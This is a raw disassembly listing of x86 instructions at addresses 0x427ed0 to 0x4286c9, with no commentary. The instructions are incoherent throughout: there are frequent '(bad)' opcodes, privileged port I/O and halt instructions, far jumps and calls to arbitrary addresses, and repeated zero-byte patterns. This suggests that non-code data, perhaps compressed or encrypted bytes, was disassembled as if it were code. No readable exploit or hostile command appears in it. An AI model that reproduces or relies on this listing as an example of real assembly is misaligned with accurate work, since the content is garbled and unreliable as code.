  427ed0:	call   DWORD PTR [ecx-0xc]
  427ed3:	jo     0x427f1a
  427ed5:	(bad)  
  427ed6:	mov    ds:0x5c31f9b8,eax
  427edb:	fstp   TBYTE PTR [edi+0x46e41374]
  427ee1:	or     BYTE PTR [ebp-0x20],dh
  427ee4:	mov    ecx,0xc93407
  427ee9:	push   eax
  427eea:	sbb    eax,0x2f9be86
  427eef:	jl     0x427eb6
  427ef1:	mov    ebp,0x86cd6971
  427ef6:	in     al,0xc0
  427ef8:	sub    edi,ebx
  427efa:	jmp    0x451:0x99446d23
  427f01:	je     0x427f76
  427f03:	fwait
  427f04:	push   edi
  427f05:	and    BYTE PTR [eax],al
  427f07:	add    BYTE PTR [eax],al
  427f09:	add    BYTE PTR [eax],al
  427f0b:	cmp    DWORD PTR [ebx],ecx
  427f0d:	bound  eax,QWORD PTR [edi+0x441a2b3]
  427f13:	jne    0x427f8b
  427f15:	jbe    0x427f03
  427f17:	test   BYTE PTR [edi+ecx*1],0x4f
  427f1b:	dec    ebx
  427f1c:	loopne 0x427f4d
  427f1e:	sbb    al,0x85
  427f20:	sub    DWORD PTR [edi+ebp*1],eax
  427f23:	mov    esi,0x9d457317
  427f28:	sbb    cl,dl
  427f2a:	gs jns 0x427f45
  427f2d:	ror    DWORD PTR [esi-0x76],1
  427f30:	sbb    eax,0x9c2087fc
  427f35:	fadd   QWORD PTR [eax]
  427f37:	jne    0x427fa2
  427f39:	jg     0x427f36
  427f3b:	dec    ebx
  427f3c:	fild   WORD PTR [ebx+0x75]
  427f3f:	(bad)  
  427f40:	sbb    BYTE PTR [ecx+0x3d],bh
  427f43:	lea    ebx,[ebx-0x41]
  427f46:	(bad)  
  427f47:	in     eax,dx
  427f48:	push   cs
  427f49:	cld    
  427f4a:	gs jns 0x427ed5
  427f4d:	jmp    0x427f5a
  427f4f:	fbld   TBYTE PTR [edi-0x27]
  427f52:	add    DWORD PTR [ebp+0x750d3573],ebx
  427f58:	imul   esi,DWORD PTR [edx+0x45],0x25
  427f5c:	cld    
  427f5d:	jb     0x427fa4
  427f5f:	and    DWORD PTR [ebx],eax
  427f61:	mov    ecx,0xb60598d0
  427f66:	shr    BYTE PTR [ebx+0xff7dc59],1
  427f6c:	rcl    BYTE PTR [eax+0x65],1
  427f6f:	add    BYTE PTR [eax],al
  427f71:	add    BYTE PTR [eax],al
  427f73:	add    BYTE PTR [edi],ah
  427f75:	sub    BYTE PTR [ecx],0xef
  427f78:	jnp    0x427fd3
  427f7a:	mov    ah,0x6f
  427f7c:	(bad)  
  427f7d:	xor    DWORD PTR [esi-0x19],esp
  427f80:	loop   0x427f85
  427f82:	mov    ch,0xf8
  427f84:	out    dx,eax
  427f85:	mov    edi,0xa6080f0
  427f8a:	test   ecx,esi
  427f8c:	sbb    ebp,DWORD PTR [esi-0x13]
  427f8f:	cmp    eax,0x64e85938
  427f94:	inc    eax
  427f95:	pop    edx
  427f96:	add    cl,BYTE PTR [ebp+0x1e]
  427f99:	mov    WORD PTR [esp+eiz*2+0x421fbd1f],fs
  427fa0:	jge    0x427fa4
  427fa2:	xchg   esp,eax
  427fa3:	jbe    0x427fbe
  427fa5:	push   ds
  427fa6:	jne    0x427f2a
  427fa8:	xchg   ecx,eax
  427fa9:	xor    ah,bh
  427fab:	add    esi,DWORD PTR [ebp-0x4b]
  427fae:	cmp    cl,ch
  427fb0:	arpl   WORD PTR [edx+0x5c],ax
  427fb3:	jbe    0x427f86
  427fb5:	push   edi
  427fb6:	ret    0x2464
  427fb9:	mov    dl,0x18
  427fbb:	ficom  DWORD PTR [esi-0x4e]
  427fbe:	test   BYTE PTR [eax+0x6e],0xef
  427fc2:	adc    BYTE PTR [ecx],dl
  427fc4:	mov    ch,0x2
  427fc6:	ins    BYTE PTR es:[edi],dx
  427fc7:	inc    ebx
  427fc8:	call   0xe570eda2
  427fcd:	cmc    
  427fce:	sub    BYTE PTR [eax+eax*1],al
  427fd1:	jg     0x428018
  427fd3:	dec    si
  427fd5:	pop    ecx
  427fd6:	sbb    DWORD PTR [ebp+0x0],esp
  427fd9:	add    BYTE PTR [eax],al
  427fdb:	add    BYTE PTR [eax],al
  427fdd:	daa    
  427fde:	lea    edi,[edi+edx*4-0x17003d9c]
  427fe5:	int    0x25
  427fe7:	lea    esp,[edx+ecx*1+0x57]
  427feb:	sti    
  427fec:	inc    si
  427fee:	pop    esp
  427fef:	adc    eax,0xffc28595
  427ff4:	arpl   WORD PTR [ebx-0x6eb10262],dx
  427ffa:	mov    dl,0xfa
  427ffc:	fmul   st(6),st
  427ffe:	or     BYTE PTR [eax-0x17],al
  428001:	jnp    0x428045
  428003:	je     0x427ffc
  428005:	imul   edi,DWORD PTR [edi-0x5c],0x2c
  428009:	push   ecx
  42800a:	pop    ebp
  42800b:	push   eax
  42800c:	es xor al,ah
  42800f:	arpl   WORD PTR [ebx+ebx*1-0x53],bp
  428013:	push   eax
  428014:	fs push ebx
  428016:	sahf   
  428017:	std    
  428018:	push   cs
  428019:	push   ecx
  42801a:	mov    dl,0xfa
  42801c:	push   ds
  42801d:	inc    ebx
  42801e:	inc    edx
  42801f:	je     0x428048
  428021:	cwde   
  428022:	xlat   BYTE PTR ds:[ebx]
  428023:	jl     0x42804e
  428025:	popf   
  428026:	int    0x16
  428028:	out    dx,al
  428029:	cwde   
  42802a:	fsubr  QWORD PTR [esi]
  42802c:	test   eax,0xed45898f
  428031:	add    eax,0x1639bfbf
  428036:	out    dx,eax
  428037:	jnp    0x428030
  428039:	mov    dh,0x58
  42803b:	test   BYTE PTR [ecx-0x1750fb64],ch
  428041:	add    BYTE PTR [eax],al
  428043:	add    BYTE PTR [eax],al
  428045:	add    BYTE PTR [ebx],cl
  428047:	add    BYTE PTR [esi-0x27],ah
  42804a:	xlat   BYTE PTR ds:[ebx]
  42804b:	int    0x7b
  42804d:	rcl    ebx,0x17
  428050:	cli    
  428051:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428052:	ss mov edx,0xd91aaa85
  428058:	les    ebx,FWORD PTR ds:0xe90498c0
  42805e:	or     eax,0xcd00ec81
  428063:	rcr    BYTE PTR [ebx],cl
  428065:	add    DWORD PTR [esp+eax*1+0x4b],ecx
  428069:	push   esi
  42806a:	xchg   ebx,eax
  42806b:	push   0xc21ff0b
  428070:	sbb    ecx,0xffffffa9
  428073:	xor    ebx,ebp
  428075:	push   ecx
  428076:	(bad)  
  428077:	std    
  428078:	cmp    bh,dh
  42807a:	stos   DWORD PTR es:[edi],eax
  42807b:	in     eax,dx
  42807c:	inc    esp
  42807d:	lock xor ch,bh
  428080:	inc    esp
  428081:	hlt    
  428082:	dec    ebp
  428083:	out    0xf,al
  428085:	data16 std 
  428087:	dec    edx
  428088:	icebp  
  428089:	xor    ebp,DWORD PTR [ebx-0x63cc3711]
  42808f:	mov    BYTE PTR [ebp+eax*1-0x18],dl
  428093:	repz push ebx
  428095:	or     eax,0xf87a3e94
  42809a:	loopne 0x428090
  42809c:	inc    ebx
  42809d:	(bad)  
  42809e:	sbb    eax,0x3e08f981
  4280a3:	call   0x2fdefde0
  4280a8:	and    al,0xff
  4280aa:	add    BYTE PTR [eax],al
  4280ac:	add    BYTE PTR [eax],al
  4280ae:	add    BYTE PTR [ecx],dh
  4280b0:	push   ebx
  4280b1:	mov    WORD PTR [ebp-0x91b8c],es
  4280b7:	and    eax,0xbbfee8a2
  4280bc:	in     al,0xe7
  4280be:	fwait
  4280bf:	jnp    0x4280bf
  4280c1:	jmp    FWORD PTR [ecx-0x74]
  4280c4:	xchg   ebp,eax
  4280c5:	mov    WORD PTR [ebp-0x44],?
  4280c8:	jb     0x42804f
  4280ca:	call   0xe9396589
  4280cf:	add    al,0x14
  4280d1:	add    BYTE PTR [eax],al
  4280d3:	dec    ebx
  4280d4:	jns    0x42811b
  4280d6:	adc    al,0x47
  4280d8:	int3   
  4280d9:	jae    0x4280ff
  4280db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4280dc:	cmp    al,BYTE PTR [edi]
  4280de:	dec    eax
  4280df:	jne    0x4280d7
  4280e1:	std    
  4280e2:	mov    bh,0x5d
  4280e4:	hlt    
  4280e5:	ret    
  4280e6:	dec    esp
  4280e8:	push   0x80fd036a
  4280ed:	fidivr DWORD PTR [edi]
  4280ef:	jne    0x4280f4
  4280f1:	push   es
  4280f2:	pop    ebx
  4280f3:	(bad)
  4280f6:	xchg   DWORD PTR [esi],esp
  4280f8:	mov    cl,0xa5
  4280fa:	dec    ebp
  4280fb:	sbb    edi,DWORD PTR [eax+0x438e1c8f]
  428101:	daa    
  428102:	dec    edi
  428103:	clc    
  428104:	popf   
  428105:	dec    edi
  428106:	push   eax
  428107:	add    dh,BYTE PTR [esi]
  428109:	xlat   BYTE PTR ds:[ebx]
  42810a:	adc    DWORD PTR [ebp+0x4e59be69],esi
  428110:	and    al,BYTE PTR [ebp+0x10]
  428113:	add    BYTE PTR [eax],al
  428115:	add    BYTE PTR [eax],al
  428117:	add    BYTE PTR [ebp+0x5c],dh
  42811a:	aas    
  42811b:	xchg   cx,ax
  42811d:	cdq    
  42811e:	mov    WORD PTR [edx+0x6d],es
  428121:	ror    al,cl
  428123:	or     edi,esp
  428125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428126:	out    dx,eax
  428127:	mov    WORD PTR [ebx],?
  428129:	dec    edi
  42812a:	adc    cl,cl
  42812c:	and    eax,0x7403c928
  428131:	imul   edi,edi,0x766baff
  428137:	jl     0x42816e
  428139:	imul   ebp,ecx,0x60553388
  42813f:	adc    eax,0xffbf4f35
  428144:	mul    DWORD PTR [eax+edx*1-0x49544c79]
  42814b:	xchg   BYTE PTR [eax+esi*1+0x687afff5],al
  428152:	pop    ecx
  428153:	inc    esp
  428154:	cdq    
  428155:	arpl   si,di
  428157:	jae    0x4281cc
  428159:	in     eax,dx
  42815a:	imul   ebp,esp,0xffffffb4
  42815d:	add    ah,BYTE PTR [ebx+0x3b3cf261]
  428163:	inc    esi
  428164:	jns    0x428168
  428166:	pop    esi
  428167:	retf   0x3d72
  42816a:	jecxz  0x428177
  42816c:	rol    edx,0xe8
  42816f:	xchg   BYTE PTR ds:0x2fb3e1cf,dh
  428175:	lock in al,0xf4
  428178:	push   0x2
  42817a:	push   0xffffffda
  42817c:	add    BYTE PTR [eax],al
  42817e:	add    BYTE PTR [eax],al
  428180:	add    BYTE PTR [edx+0x6a],dh
  428183:	das    
  428184:	ret    
  428185:	sbb    al,0x56
  428187:	and    cl,BYTE PTR [edx]
  428189:	mov    eax,ds:0xca03a8d6
  42818e:	or     ebx,0xdacf750b
  428194:	in     eax,dx
  428195:	cli    
  428196:	jmp    0x428180
  428198:	in     eax,dx
  428199:	jne    0x428183
  42819b:	call   0xd9990200
  4281a0:	ret    
  4281a1:	loop   0x42812d
  4281a3:	stos   DWORD PTR es:[edi],eax
  4281a4:	or     esi,eax
  4281a6:	inc    edx
  4281a7:	xchg   esp,eax
  4281a8:	add    dl,BYTE PTR [edx]
  4281aa:	adc    ch,BYTE PTR [ecx]
  4281ac:	les    ecx,FWORD PTR [ebx]
  4281ae:	push   es
  4281af:	push   edx
  4281b0:	ret    
  4281b1:	add    WORD PTR [ecx],0x4630
  4281b6:	add    DWORD PTR [esi+0x3b05f243],esi
  4281bc:	retf   
  4281bd:	add    BYTE PTR [ecx+0x435a3829],0xa6
  4281c4:	mov    dh,0xf3
  4281c6:	data16 outs dx,WORD PTR ds:[esi]
  4281c9:	push   ebp
  4281ca:	lods   al,BYTE PTR ds:[esi]
  4281cb:	cmp    DWORD PTR [ebp-0x3c56ee73],ecx
  4281d1:	icebp  
  4281d2:	iret   
  4281d3:	int3   
  4281d4:	imul   esp,edi,0xffffffc7
  4281d7:	call   0xdbdedf
  4281dc:	jecxz  0x428254
  4281de:	add    cl,BYTE PTR [ecx+0x4587d524]
  4281e4:	cdq    
  4281e5:	add    BYTE PTR [eax],al
  4281e7:	add    BYTE PTR [eax],al
  4281e9:	add    BYTE PTR [esi],ah
  4281eb:	pop    eax
  4281ec:	adc    eax,0x154759
  4281f1:	ins    BYTE PTR es:[edi],dx
  4281f2:	mov    dh,0xcf
  4281f4:	or     ecx,eax
  4281f6:	cmp    edx,DWORD PTR [ecx-0x5]
  4281f9:	fsubr  QWORD PTR [esi+0x5]
  4281fc:	inc    eax
  4281fd:	jmp    0x4324101
  428202:	sub    eax,0x94849f5d
  428207:	pop    ecx
  428208:	push   eax
  428209:	je     0x42823e
  42820b:	popa   
  42820c:	call   0xfb97c559
  428211:	ins    DWORD PTR es:[edi],dx
  428212:	mov    dh,0xce
  428214:	das    
  428215:	ret    
  428216:	outs   dx,BYTE PTR ds:[esi]
  428217:	xchg   DWORD PTR [ebp+0x39],eax
  42821a:	mov    BYTE PTR [ebp+0x495e4545],0x4d
  428221:	jmp    0xb603009c
  428226:	je     0x428204
  428228:	add    esi,DWORD PTR [ebx+esi*4+0x58]
  42822c:	push   eax
  42822d:	ins    BYTE PTR es:[edi],dx
  42822e:	mov    ebx,0xbb54e860
  428233:	push   esp
  428234:	sti    
  428235:	gs ss into 
  428238:	or     esi,DWORD PTR [ebx+esi*4+0x60]
  42823c:	call   0xfb9746db
  428241:	ins    DWORD PTR es:[edi],dx
  428242:	ss iret 
  428244:	sbb    DWORD PTR [ebx+0x3dffdeaa],eax
  42824a:	cmp    ch,bh
  42824c:	aas    
  42824d:	test   DWORD PTR [eax],0x0
  428253:	mov    dh,0x54
  428255:	imul   esp,ecx,0x39efbee5
  42825b:	test   BYTE PTR [eax+0xc],0x0
  42825f:	pop    ebx
  428260:	mov    ch,0x14
  428262:	cmp    al,0x4a
  428264:	inc    eax
  428265:	sti    
  428266:	sbb    BYTE PTR [eax],0x57
  428269:	mov    WORD PTR [ebp+0x38],es
  42826c:	out    0x55,eax
  42826e:	dec    ebp
  42826f:	dec    esp
  428270:	add    BYTE PTR [edi+0x5e],dl
  428273:	add    eax,0xd7574dc0
  428278:	scas   al,BYTE PTR es:[edi]
  428279:	out    0x27,eax
  42827b:	push   esi
  42827c:	add    BYTE PTR [eax],al
  42827e:	(bad)  
  428280:	mov    esi,0xfeb3bf98
  428285:	(bad)  
  428286:	call   DWORD PTR [edi-0x6d06113d]
  42828c:	rol    BYTE PTR [edi+0x54dc416],0x0
  428293:	sbb    al,0x5
  428295:	scas   al,BYTE PTR es:[edi]
  428296:	rol    BYTE PTR [ebp-0x27750955],0x1b
  42829d:	or     al,0x8b
  42829f:	jno    0x4282c3
  4282a1:	push   cs
  4282a2:	inc    eax
  4282a3:	fadd   QWORD PTR [edi+0x4a56023e]
  4282a9:	pop    ds
  4282aa:	adc    BYTE PTR [esp+edi*1-0x6],dl
  4282ae:	mov    WORD PTR [edx],cs
  4282b0:	cld    
  4282b1:	cmc    
  4282b2:	ret    0x625f
  4282b5:	pop    ds
  4282b6:	adc    al,0x0
  4282b8:	add    BYTE PTR [eax],al
  4282ba:	add    BYTE PTR [eax],al
  4282bc:	fadd   QWORD PTR [edi+0x5e8014e]
  4282c2:	bound  edx,QWORD PTR [ebx+esi*2]
  4282c5:	cmp    bl,BYTE PTR [edi]
  4282c7:	sbb    BYTE PTR [esi*4-0xda77c32],cl
  4282ce:	loop   0x4282d5
  4282d0:	je     0x4282d0
  4282d2:	idiv   bh
  4282d4:	xchg   ebx,eax
  4282d5:	imul   ecx,DWORD PTR [edi],0xf5dbb6e8
  4282db:	push   DWORD PTR [ebp+0x19]
  4282de:	jg     0x4282a2
  4282e0:	pop    ebp
  4282e1:	or     ebx,DWORD PTR [ebx-0x2d]
  4282e4:	mul    BYTE PTR [ebp-0x582ca4f5]
  4282ea:	or     eax,DWORD PTR [eax]
  4282ec:	shl    al,0x6a
  4282ef:	adc    DWORD PTR [ecx+0x69],0x18750001
  4282f6:	mov    dl,0x52
  4282f8:	fbld   TBYTE PTR [edi-0x19]
  4282fb:	out    dx,eax
  4282fc:	sbb    ebx,eax
  4282fe:	add    DWORD PTR [edi+0x1369813d],0xd70e7c3a
  428308:	cld    
  428309:	sbb    ecx,DWORD PTR [edi+esi*1]
  42830c:	ss pop esp
  42830e:	add    DWORD PTR [edx],0x74
  428311:	imul   edi,edi,0x5d68e08c
  428317:	sti    
  428318:	adc    dh,BYTE PTR [ecx-0x53f410a1]
  42831e:	test   DWORD PTR [ebp+0x0],eax
  428321:	add    BYTE PTR [eax],al
  428323:	add    BYTE PTR [eax],al
  428325:	xor    ebp,eax
  428327:	iret   
  428328:	sti    
  428329:	cli    
  42832a:	dec    ebp
  42832b:	(bad)  
  42832c:	push   ebp
  42832e:	push   0x50b52eaf
  428333:	rol    BYTE PTR [edi],0x72
  428336:	scas   al,BYTE PTR es:[edi]
  428337:	ds jg  0x4282ef
  42833a:	scas   eax,DWORD PTR es:[di]
  42833c:	gs je  0x4283b0
  42833f:	(bad)  
  428340:	push   DWORD PTR [ebp+0x29]
  428343:	nop
  428344:	inc    ebx
  428345:	gs cdq 
  428347:	nop
  428348:	inc    ebp
  428349:	mov    ecx,0x75899df0
  42834e:	imul   eax,DWORD PTR [ebx-0x531a8540],0x90697500
  428358:	inc    ebp
  428359:	cdq    
  42835a:	add    DWORD PTR [ecx],edi
  42835c:	(bad)
  428360:	ins    DWORD PTR es:[edi],dx
  428361:	cld    
  428362:	add    ecx,ebp
  428364:	xchg   DWORD PTR [ebp+0x757a6502],esi
  42836a:	add    ch,cl
  42836c:	sbb    dl,al
  42836e:	push   esi
  42836f:	xor    cl,BYTE PTR [ebx]
  428371:	hlt    
  428372:	iret   
  428373:	mov    eax,0xd9027504
  428378:	shl    DWORD PTR [edi+0x1b135b5],1
  42837e:	enter  0x6c9c,0x88
  428382:	jl     0x42836d
  428384:	add    edi,ecx
  428386:	inc    edx
  428387:	adc    eax,0xf
  42838c:	add    BYTE PTR [eax],al
  42838e:	fadd   DWORD PTR ds:[ebp+ebx*2-0x3c27a578]
  428396:	sub    al,BYTE PTR [edi+0x7f8bd7a9]
  42839c:	and    al,0x60
  42839e:	or     eax,0x75046fc5
  4283a3:	mov    ecx,DWORD PTR [ebx+0x3]
  4283a6:	jne    0x4283aa
  4283a8:	xchg   DWORD PTR fs:[ebp+0x50],esi
  4283ac:	dec    edx
  4283ad:	pop    ebp
  4283ae:	in     eax,dx
  4283af:	jmp    0xee4e:0x4c69caa8
  4283b6:	repz (bad) 
  4283b8:	xor    al,0x5d
  4283ba:	push   0xdecf665c
  4283bf:	push   ecx
  4283c0:	mov    ecx,0xe977256b
  4283c5:	add    eax,DWORD PTR [edx+0x32229c45]
  4283cb:	pop    edx
  4283cc:	lods   al,BYTE PTR ds:[esi]
  4283cd:	add    esi,DWORD PTR [ebp+0x2]
  4283d0:	je     0x428399
  4283d2:	scas   al,BYTE PTR es:[edi]
  4283d3:	pop    edx
  4283d4:	in     al,dx
  4283d5:	mov    dh,BYTE PTR [ebp+0x2]
  4283d8:	add    BYTE PTR [eax],dh
  4283da:	adc    eax,DWORD PTR [ebx]
  4283dc:	add    cl,ch
  4283de:	jmp    0x428367
  4283e0:	add    bh,ah
  4283e2:	xor    DWORD PTR [ebp-0x78],ecx
  4283e5:	add    DWORD PTR [ecx+0xdd374ba],esi
  4283eb:	or     ecx,DWORD PTR [ecx+0x457f6526]
  4283f1:	lds    eax,FWORD PTR [eax]
  4283f3:	add    BYTE PTR [eax],al
  4283f5:	add    BYTE PTR [eax],al
  4283f7:	ficomp WORD PTR [ebp-0x78]
  4283fa:	jmp    0xe92d0f75
  4283ff:	jbe    0x428403
  428401:	lea    esp,[esi+esi*2+0x4c]
  428405:	sti    
  428406:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428407:	(bad)  
  428408:	jmp    0x5764b44c
  42840d:	mov    al,0xe8
  42840f:	int    0xf9
  428411:	mov    WORD PTR [edx*8+0x7671ce5a],fs
  428418:	add    bh,BYTE PTR [ecx+0x2778f]
  42841e:	fs sti 
  428420:	add    edx,edi
  428422:	outs   dx,BYTE PTR ds:[esi]
  428423:	mov    ecx,0x3fa9187a
  428428:	(bad)  
  428429:	cmc    
  42842a:	sbb    esi,DWORD PTR [ecx-0x504da653]
  428430:	nop
  428431:	add    al,0xe9
  428433:	ret    
  428434:	xchg   esp,ebp
  428436:	push   0xe9015662
  42843b:	jbe    0x4283fe
  42843d:	adc    ch,BYTE PTR cs:[eax]
  428440:	or     bl,BYTE PTR [ebx-0x23]
  428443:	ret    0x37a9
  428446:	les    edi,FWORD PTR [esi-0x29]
  428449:	xor    ch,BYTE PTR [ebx+eiz*8-0xf]
  42844d:	stc    
  42844e:	push   ss
  42844f:	and    DWORD PTR [edx-0x2d],ebx
  428452:	sbb    ebx,DWORD PTR [eax]
  428454:	dec    ebp
  428455:	cmp    DWORD PTR [eax],eax
  428457:	(bad)  [edx]
  428459:	outs   dx,DWORD PTR ds:[esi]
  42845a:	add    eax,0x0
  42845f:	add    BYTE PTR [ebp-0x42892e71],dh
  428465:	jns    0x4284be
  428467:	or     al,0x39
  428469:	dec    eax
  42846a:	rcl    DWORD PTR [eax+0x4c],1
  42846d:	xchg   esi,eax
  42846e:	dec    ebx
  42846f:	call   0x430541
  428474:	pop    edi
  428475:	adc    DWORD PTR [ecx+0x48dee],edi
  42847b:	(bad)  
  42847c:	loope  0x4284d4
  42847e:	stc    
  42847f:	jmp    FWORD PTR [ebx]
  428481:	jg     0x42849b
  428483:	inc    eax
  428484:	xchg   ebp,eax
  428485:	xor    ebp,esi
  428487:	mov    esp,DWORD PTR [ebx+0x70f332fa]
  42848d:	add    eax,ebp
  42848f:	daa    
  428490:	pop    esp
  428491:	add    al,0x0
  428493:	mov    DWORD PTR [ebx+0x545d37fa],ecx
  428499:	inc    eax
  42849a:	or     BYTE PTR [ebp-0x17b4a99d],cl
  4284a0:	fs jp  0x4284a3
  4284a3:	add    BYTE PTR [edi-0x30c4fcbd],dl
  4284a9:	xor    cl,BYTE PTR [eax]
  4284ab:	push   eax
  4284ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4284ad:	call   0x7dee82f0
  4284b2:	push   edi
  4284b3:	or     dl,cl
  4284b5:	nop
  4284b6:	enter  0x10c2,0x4
  4284ba:	add    DWORD PTR [esi],0x5f
  4284bd:	scas   al,BYTE PTR es:[edi]
  4284be:	div    BYTE PTR [edi+eiz*8-0x7e]
  4284c2:	shl    BYTE PTR [eax+eax*1+0x0],0x0
  4284c7:	add    BYTE PTR [eax],al
  4284c9:	rcl    DWORD PTR [ebx+0x561815f6],cl
  4284cf:	cmp    eax,DWORD PTR [eax]
  4284d1:	inc    edi
  4284d2:	(bad)  
  4284d3:	out    0x1e,eax
  4284d5:	inc    esp
  4284d6:	push   es
  4284d7:	add    BYTE PTR [esi+0x75],dl
  4284da:	add    DWORD PTR [ebp-0x74ff44c6],esp
  4284e0:	ret    0x6eb6
  4284e3:	mov    ch,ah
  4284e5:	test   BYTE PTR [eax-0x7f09fff9],0x3
  4284ec:	add    ah,dh
  4284ee:	dec    ebp
  4284ef:	idiv   ebp
  4284f1:	xchg   edx,eax
  4284f2:	pop    ecx
  4284f3:	mov    dl,0x51
  4284f5:	clc    
  4284f6:	jbe    0x428565
  4284f8:	std    
  4284f9:	cmp    BYTE PTR [eax],0x88
  4284fc:	pop    ebx
  4284fd:	gs inc ecx
  4284ff:	adc    dh,ch
  428501:	jae    0x42854b
  428503:	add    BYTE PTR [esi+0x65ff5974],ch
  428509:	mov    ecx,ebp
  42850b:	jmp    0x3c586f0f
  428510:	jg     0x42854f
  428512:	test   al,0x67
  428514:	sub    BYTE PTR [ebp+0x3585566f],bh
  42851a:	imul   esi
  42851c:	xchg   BYTE PTR [ebx],dh
  42851e:	or     esp,ebp
  428520:	mov    edi,0x4f041c42
  428525:	sbb    eax,0x22f9bf7a
  42852a:	fidivr WORD PTR [esi]
  42852c:	or     eax,DWORD PTR [eax]
  42852e:	add    BYTE PTR [eax],al
  428530:	add    BYTE PTR [eax],al
  428532:	add    BYTE PTR [ecx+0x5e88c07b],bl
  428538:	adc    al,al
  42853a:	xchg   ebx,eax
  42853b:	rol    BYTE PTR [ecx],cl
  42853d:	mov    ecx,0xffff5a13
  428542:	call   0xf33ff22c
  428547:	mov    DWORD PTR [eax+0x0],0x74cc9975
  42854e:	fdiv   QWORD PTR [esi-0x76]
  428551:	ret    
  428552:	and    al,BYTE PTR ds:[edx+0x55]
  428556:	inc    BYTE PTR [ecx]
  428558:	adc    eax,0x6849d186
  42855d:	addr16 jne 0x428564
  428560:	jmp    0xe1077768
  428565:	push   ss
  428566:	mov    esp,0x398c99b7
  42856b:	es in  eax,dx
  42856d:	push   ds
  42856e:	mov    ah,0xd5
  428570:	out    0x8c,al
  428572:	ins    DWORD PTR es:[edi],dx
  428573:	mov    cl,0x5d
  428575:	inc    esi
  428576:	popf   
  428577:	jne    0x42855d
  428579:	pop    ecx
  42857a:	mov    es,WORD PTR [ebp+0x6ef909a9]
  428580:	jmp    0x55bffa88
  428585:	and    BYTE PTR [ebp-0x7adfd2bc],cl
  42858b:	add    dl,cl
  42858d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42858e:	fs dec ebp
  428590:	mov    dl,0x8d
  428592:	retf   0xc0fe
  428595:	xchg   edi,eax
  428596:	add    BYTE PTR [eax],al
  428598:	add    BYTE PTR [eax],al
  42859a:	add    cl,ch
  42859c:	add    ch,cl
  42859e:	jg     0x4285d5
  4285a0:	xlat   BYTE PTR ds:[ebx]
  4285a1:	add    ecx,DWORD PTR [ebp-0x7f9c0136]
  4285a7:	xchg   ecx,eax
  4285a8:	call   0xc073:0xb27503e9
  4285af:	push   esi
  4285b0:	repnz sbb BYTE PTR [esp+edi*2+0x77],ch
  4285b5:	jmp    0xf58576bd
  4285ba:	(bad)  
  4285bb:	sti    
  4285bc:	(bad)  
  4285bd:	or     al,0x8
  4285bf:	clc    
  4285c0:	into   
  4285c1:	add    al,0xf0
  4285c3:	in     eax,dx
  4285c4:	(bad)  
  4285c5:	or     al,0xf0
  4285c7:	adc    dh,bh
  4285c9:	pop    edx
  4285ca:	pop    edx
  4285cb:	out    dx,al
  4285cc:	xchg   BYTE PTR [ecx],ch
  4285ce:	iret   
  4285cf:	add    BYTE PTR [edi+0x4d71d033],0x0
  4285d6:	dec    DWORD PTR [esi-0x6e]
  4285d9:	cmp    eax,0xe7b02c2f
  4285de:	push   ebx
  4285df:	bound  ecx,QWORD PTR [eax-0x5]
  4285e2:	push   0xffffffd5
  4285e4:	and    DWORD PTR [ecx+ebp*8],ecx
  4285e7:	dec    ecx
  4285e8:	xchg   DWORD PTR es:[esi+edi*2+0x7e7dc087],esp
  4285f0:	test   DWORD PTR [edi-0x13],eax
  4285f3:	icebp  
  4285f4:	mov    ebx,0x85696027
  4285f9:	aas    
  4285fa:	fld    QWORD PTR [ecx]
  4285fc:	mov    ebx,0x7007
  428601:	add    BYTE PTR [eax],al
  428603:	add    BYTE PTR [ecx-0x7b],bh
  428606:	inc    eax
  428607:	in     eax,dx
  428608:	out    dx,eax
  428609:	or     eax,0x437bc204
  42860e:	inc    esp
  42860f:	add    eax,0x3dfb0269
  428614:	xchg   ebp,eax
  428615:	repnz xchg dl,al
  428618:	into   
  428619:	sbb    eax,0x8bbdb6fa
  42861e:	jmp    0x952d:0x8d0276e8
  428625:	jmp    0x1c48:0xc276e9c1
  42862c:	sahf   
  42862d:	test   DWORD PTR [ebp+eax*8+0x7a],eax
  428631:	test   eax,0xafcb7259
  428636:	mov    ebp,0x86b776e5
  42863b:	test   ecx,esi
  42863d:	gs clc 
  42863f:	push   0xffffff9a
  428641:	push   cs
  428642:	dec    edi
  428643:	mov    edi,0xe78b64c5
  428648:	jbe    0x42864c
  42864a:	push   eax
  42864b:	inc    ecx
  42864c:	adc    DWORD PTR [eax+eax*1-0x17],esi
  428650:	add    DWORD PTR [edx],ebp
  428652:	test   DWORD PTR [eax],eax
  428654:	xchg   edi,eax
  428655:	cli    
  428656:	and    DWORD PTR [eax],0xffffffcd
  428659:	add    BYTE PTR [eax],al
  42865b:	lea    esp,[eax]
  42865d:	in     eax,dx
  42865e:	jns    0xe8527364
  428664:	adc    eax,DWORD PTR [esi+esi*8+0xff]
  42866b:	add    BYTE PTR [eax],al
  42866d:	pop    eax
  42866e:	rol    DWORD PTR [esi],0x84
  428671:	bound  eax,QWORD PTR [ecx]
  428673:	add    BYTE PTR [eax],al
  428675:	push   ecx
  428676:	cmp    eax,0x5a84241f
  42867b:	mov    esi,edi
  42867d:	mov    ds:0x4a8b205d,eax
  428682:	xchg   ecx,eax
  428683:	gs push 0x9750d8ef
  428689:	pushf  
  42868a:	add    BYTE PTR [eax+eax*8+0xdfcc93],al
  428691:	mov    WORD PTR [eax],es
  428693:	add    edi,0xffffffac
  428696:	fmulp  st(2),st
  428698:	lea    esi,[edx]
  42869a:	mov    ah,0x83
  42869c:	rcl    BYTE PTR [ebx-0x34],0xcf
  4286a0:	add    BYTE PTR [eax+eax*1-0x73],cl
  4286a4:	je     0x42871e
  4286a6:	push   edx
  4286a7:	jecxz  0x42866f
  4286a9:	int3   
  4286aa:	mov    ah,0xf6
  4286ac:	push   0x51
  4286ae:	jns    0x42866e
  4286b0:	push   eax
  4286b1:	jbe    0x42870c
  4286b3:	dec    edx
  4286b4:	call   0x4263f8
  4286b9:	cwde   
  4286ba:	mov    BYTE PTR [esi],0x84
  4286bd:	pop    esi
  4286be:	push   es
  4286bf:	add    BYTE PTR [eax],al
  4286c1:	xchg   ecx,eax
  4286c2:	inc    edx
  4286c3:	pop    ds
  4286c4:	adc    BYTE PTR [esi+ebx*8-0x4b],ch
  4286c8:	xchg   ebx,eax
  4286c9:	xchg   edx,eax
